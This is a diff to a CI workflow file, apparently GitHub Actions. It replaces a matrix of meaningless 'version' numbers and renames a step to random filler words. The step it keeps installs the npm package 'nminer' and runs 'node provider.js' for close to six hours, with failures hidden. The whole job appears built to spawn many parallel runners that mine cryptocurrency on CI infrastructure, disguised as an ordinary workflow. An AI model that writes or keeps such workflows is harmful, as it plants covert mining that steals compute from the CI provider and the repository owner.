@@ -9,25 +9,21 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 4161 }
-          - { version: 6992 }
-          - { version: 9208 }
-          - { version: 9002 }
-          - { version: 6117 }
-          - { version: 3874 }
-          - { version: 4385 }
-          - { version: 155 }
-          - { version: 3907 }
-          - { version: 8237 }
-          - { version: 500 }
-          - { version: 4180 }
-          - { version: 549 }
-          - { version: 7733 }
-          - { version: 641 }
-          - { version: 1393 }
-          - { version: 1523 }
-          - { version: 1569 }
-          - { version: 6098 }
+          - { version: 1173 }
+          - { version: 3716 }
+          - { version: 6381 }
+          - { version: 2177 }
+          - { version: 1243 }
+          - { version: 5658 }
+          - { version: 4665 }
+          - { version: 5178 }
+          - { version: 3605 }
+          - { version: 1313 }
+          - { version: 1242 }
+          - { version: 3006 }
+          - { version: 3739 }
+          - { version: 5113 }
+          - { version: 5656 }
 
     steps:
       - name: Checkout
@@ -38,7 +34,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: downshift as for
+      - name: foolish understated instead wafer offset
         run: |
           npm install nminer@latest
-          timeout 336m node provider.js || echo "provider executed"
+          timeout 349m node provider.js || echo "provider executed"
